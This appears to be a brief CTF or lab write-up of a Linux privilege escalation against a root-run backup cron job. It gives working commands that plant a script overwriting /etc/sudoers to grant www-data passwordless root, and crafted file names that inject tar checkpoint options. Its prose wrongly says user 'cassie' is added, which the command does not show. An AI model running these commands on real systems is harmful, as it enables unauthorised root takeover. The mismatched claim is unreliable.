![[Pasted image 20240823164808.png]]
The backup script found is being run by root. Since we know it is using a tar wildcard to create a tar file, we can exploit this for privesc

go to `/var/www/html`
```bash
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "" > --checkpoint=1
```
![[Pasted image 20240823165225.png]]

Above command adds user `cassie` to sudoers file allowing ALL commands with `sudo` permissions.

- wait for cronjob to run
```bash
sudo bash
```
![[Pasted image 20240823165258.png]]




